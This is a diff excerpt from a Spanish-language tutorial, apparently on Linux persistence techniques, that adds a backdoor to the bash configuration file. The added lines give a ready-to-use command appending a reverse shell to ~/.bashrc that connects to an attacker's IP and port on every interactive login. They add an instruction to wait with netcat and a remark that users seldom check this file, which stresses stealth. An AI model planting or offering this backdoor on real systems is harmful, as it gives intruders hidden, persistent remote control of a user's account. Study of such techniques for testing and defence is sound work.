@@ -48,5 +48,9 @@ Como se puede observar en la terminal derecha, al estar esperando un minuto a ll
 ¿Cómo? Un backdoor en el archivo de configuración de bash. ¡Sí!
 En la mayoría de sistemas Linux y Unix, por defecto la shell predeterminada es la de bash. En esta shell, encontramos su archivo de configuración (~/.bashrc) y es el que se ejecuta cada vez que se inicia una sesión interactiva.
 Podemos ejecutar este comando el cual ejecutamos una instancia interactiva y posteriormente rediriccionamos la entrada y salida de bash hacia un socket de red
-
+```bash
+echo 'bash -i >& /dev/tcp/$IP/puerto 0>&1' >> ~/.bashrc
+```
+No olvide estar escuchando por netcat por el puerto correspondiente.
+Esta es una técnica un tanto robusta, ya que el usuario no suele mirar este archivo a menos que vaya a configurar algo de la shell.
 
